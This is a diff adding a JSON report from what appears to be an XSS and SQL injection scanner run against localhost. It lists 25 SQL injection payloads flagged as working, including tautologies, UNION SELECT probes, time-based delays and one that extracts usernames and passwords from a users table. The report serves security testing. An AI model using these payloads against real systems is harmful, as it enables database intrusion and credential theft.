@@ -1,0 +1,155 @@
+{
+    "summary": {
+        "total_urls": 1,
+        "xss_detected": 0,
+        "sqli_detected": 1,
+        "high_risk_urls": 1,
+        "medium_risk_urls": 0,
+        "low_risk_urls": 0,
+        "timestamp": "2025-11-10T16:33:14.819859"
+    },
+    "results": [
+        {
+            "url": "http://127.0.0.1",
+            "timestamp": "2025-11-10T16:33:08.283753",
+            "xss": {
+                "is_vulnerable": false,
+                "probability": 0.0,
+                "payloads_tested": 20,
+                "vulnerable_payloads": []
+            },
+            "sqli": {
+                "is_vulnerable": true,
+                "probability": 0.9975,
+                "payloads_tested": 25,
+                "vulnerable_payloads": [
+                    {
+                        "payload": "' OR '1'='1",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR '1'='1' --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR 1=1 --",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR 1=1#",
+                        "probability": 0.76,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR 1=1/*",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "') OR ('1'='1",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "') OR ('1'='1' --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "1' OR '1'='1",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "1' OR '1'='1' --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "1 OR 1=1 --",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "1 OR 1=1#",
+                        "probability": 0.76,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "1 OR 1=1/*",
+                        "probability": 0.9875,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION SELECT 1,2,3 --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION SELECT 1,2,3,4 --",
+                        "probability": 0.9925,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION SELECT 1,2,3,4,5 --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION ALL SELECT 1,2,3,4,5 --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION SELECT @@version --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' UNION SELECT username, password FROM users --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR sleep(5) --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR SLEEP(5) --",
+                        "probability": 0.9975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR BENCHMARK(5000000,MD5(1)) --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR 1=CONVERT(int,(SELECT @@version)) --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR 1=CAST((SELECT @@version) AS int) --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR '1'='1' WAITFOR DELAY '0:0:5' --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    },
+                    {
+                        "payload": "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+                        "probability": 0.7975,
+                        "url": "http://127.0.0.1"
+                    }
+                ]
+            }
+        }
+    ]
+}
